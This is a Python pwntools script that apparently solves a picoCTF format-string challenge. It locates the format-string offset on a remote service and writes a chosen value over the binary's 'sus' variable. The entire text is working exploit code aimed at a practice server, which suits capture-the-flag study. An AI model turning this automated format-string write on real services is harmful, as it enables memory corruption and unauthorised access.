
```python
from pwn import *

context.log_level = "critical"
context.binary = ELF('./vuln')
host = "rhea.picoctf.net"
if len(sys.argv) < 2:
    print(f"Usage: python {sys.argv[0]} <port>")
    sys.exit(1)
port = int(sys.argv[1])

def exec_fmt(payload):
    temp_p = remote(host, port)
    temp_p.recvuntil(b"What do you have to say?\n")
    temp_p.sendline(payload)
    response = temp_p.recvall()
    temp_p.close()
    return response

p = remote(host, port)
autofmt = FmtStr(exec_fmt)
offset = autofmt.offset
print(f"[+] Format String Offset: {offset}")
sus_address = context.binary.symbols['sus']
print(f"[+] Found sus at: {hex(sus_address)}")
payload = fmtstr_payload(offset, {sus_address: 0x67616c66})
print(f"[+] Final Payload: {payload}")
p.recvuntil(b"What do you have to say?\n")
p.sendline(payload)
p.interactive()
```
